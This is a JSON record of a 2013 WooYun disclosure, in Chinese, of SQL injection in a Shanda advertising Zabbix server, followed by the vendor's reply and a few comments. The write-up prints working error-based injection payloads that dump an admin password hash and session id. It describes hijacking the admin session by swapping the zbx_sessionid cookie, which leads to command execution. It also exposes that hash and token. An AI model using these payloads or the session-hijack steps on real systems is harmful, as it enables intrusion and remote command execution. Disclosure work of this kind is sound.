{"id": 8793, "wybug_id": "wooyun-2013-040304", "wybug_title": "盛大广告ZabbixSQL注入导致命令执行", "wybug_corp": "盛大网络", "wybug_author": "猪是念着倒V", "wybug_date": "2013-10-19 16:26", "wybug_open_date": "2013-10-21 17:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-10-21：\t厂商提前公开漏洞，细节向公众公开  简要描述： 盛大广告ZabbixSQL注入导致命令执行 详细说明：  盛大广告 Zabbix地址 http://zabbix.sa.snyu.com/guest没禁用 先用guest直接登陆\n\n然后来到这里 检测发现报错\n\n尝试构造语句注入\nhttpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\n爆出干货 \n\nadnin 21bf5f24883e20465a9876c4aa8a4dc9无奈小弟能力有限 21bf5f24883e20465a9876c4aa8a4dc9 MD5解不开 换个思路继续尝试cookie欺骗 构造语句\nhttpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(sessionid,0x7e,userid,0x7e,status) as char),0x7e)) from zabbix.sessions where status=0 and userid=1 LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)\n爆出session\n\nsession:00afc31ea35f3f156ebb5c4b3b119be3然后进行欺骗 直接替换zbx_sessionid为这个00afc31ea35f3f156ebb5c4b3b119be3成功以administrator登陆\n\n再来到这里 指令随意改\n\n然后来到这里 可以执行刚才设置的指令\n\n就到这里了 继续的话你懂得 我就不试了.   漏洞证明：  \n\n\n\n   修复方案：  过滤~你比我懂~求Rank~   版权声明：转载请注明来源 猪是念着倒V@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-10-20 11:22 厂商回复： 正在联系进行修复，感谢提交。 最新状态： 2013-10-21：已于10.20完成修复，感谢 猪是念着倒V   ", "replys": "漏洞评价：\n评论\n     2013-10-20 12:52 |    \t\txiaogui \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:24        | 围观大牛来了~~~)\t\t \n  zabbix.sa.snyu.com不知道是不是这个域名的，昨儿个也路过了    \n     2013-10-20 13:13 |    \t\t猪是念着倒V \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:8        | 世间没有大牛这样的称号，只有逐渐走向大牛...)\t\t \n  @xiaogui Bingo~    \n     2013-10-22 11:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}